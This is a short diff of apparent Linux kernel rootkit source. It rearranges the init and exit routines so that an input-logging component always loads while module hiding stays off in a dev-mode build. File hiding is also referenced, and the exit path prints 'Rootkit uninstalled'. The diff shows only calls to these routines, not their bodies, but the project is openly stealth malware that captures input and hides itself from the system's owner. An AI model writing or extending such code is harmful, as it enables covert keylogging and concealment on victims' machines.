@@ -21,10 +21,10 @@ static int __init main_init(void) {
 	error = outputDevice_init();
 	if (error) return error;
 
-#ifndef DEV_MODE
 	error = logInput_init();
 	if (error) return error;
 
+#ifndef DEV_MODE
 	error = moduleHide_start();
 	if (error) return error;
 #endif
@@ -41,8 +41,8 @@ static void __exit main_exit(void) {
 	fileHide_stop();
 #ifndef DEV_MODE
 	moduleHide_stop();
-	logInput_exit();
 #endif
+	logInput_exit();
 	outputDevice_exit();
 
 	printk(KERN_INFO "Rootkit uninstalled\n");
